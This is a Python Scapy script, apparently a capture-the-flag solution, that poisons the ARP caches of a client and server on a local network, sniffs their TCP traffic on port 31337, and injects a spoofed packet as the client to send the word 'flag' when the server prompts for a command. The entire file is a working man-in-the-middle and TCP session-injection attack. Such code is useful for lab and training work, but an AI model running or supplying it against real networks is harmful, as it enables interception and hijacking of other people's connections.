from scapy.all import *
import threading
import time
import signal
import sys

# Configuration
CLIENT_IP = "10.0.0.2"
SERVER_IP = "10.0.0.3"
ATTACKER_IP = "10.0.0.1"
INTERFACE = "eth0"
SERVER_PORT = 31337
MESSAGE = b"flag"  # <-- Send 'flag' directly when prompted

# Global state
sent = False

# Get MAC addresses
client_mac = getmacbyip(CLIENT_IP)
server_mac = getmacbyip(SERVER_IP)
attacker_mac = get_if_hwaddr(INTERFACE)

def arp_spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    while True:
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), iface=INTERFACE, verbose=0)
        time.sleep(2)

def restore_arp():
    print("\n[!] Restoring ARP tables and exiting...")
    send(ARP(op=2, pdst=CLIENT_IP, psrc=SERVER_IP, hwsrc=server_mac), count=3, iface=INTERFACE, verbose=0)
    send(ARP(op=2, pdst=SERVER_IP, psrc=CLIENT_IP, hwsrc=client_mac), count=3, iface=INTERFACE, verbose=0)
    sys.exit(0)

def spoof_and_inject(pkt):
    global sent
    if sent or not pkt.haslayer(Raw):
        return

    if pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP and b"command:" in pkt[Raw].load:
        print("[+] 'command:' prompt detected")

        ip = pkt[IP]
        tcp = pkt[TCP]
        ack = tcp.seq + len(pkt[Raw].load)

        spoof_ip = IP(src=CLIENT_IP, dst=SERVER_IP)
        spoof_tcp = TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=ack, flags='PA')

        payload = spoof_ip / spoof_tcp / MESSAGE
        print("[+] Spoofed packet to be sent:")
        payload.show()  # Show packet details before sending

        send(payload, iface=INTERFACE, verbose=0)
        print(f"[+] Sent spoofed 'flag' command as client")

        sent = True

def sniff_response(pkt):
    if pkt.haslayer(Raw) and pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
        print("[+] Intercepted packet (sniff_response):")
        pkt.show()

def handle_packet(pkt):
    spoof_and_inject(pkt)
    sniff_response(pkt)

if __name__ == "__main__":
    print(f"[+] Attacker MAC: {attacker_mac}")
    print(f"[+] Client MAC: {client_mac}")
    print(f"[+] Server MAC: {server_mac}")

    # Clean exit on Ctrl+C
    signal.signal(signal.SIGINT, lambda sig, frame: restore_arp())

    # Start ARP spoofing in both directions
    threading.Thread(target=arp_spoof, args=(CLIENT_IP, SERVER_IP), daemon=True).start()
    threading.Thread(target=arp_spoof, args=(SERVER_IP, CLIENT_IP), daemon=True).start()
    print("[*] ARP spoofing in progress...")

    # Start sniffing and injecting
    sniff(iface=INTERFACE, filter=f"tcp and port {SERVER_PORT}", prn=handle_packet, store=0)
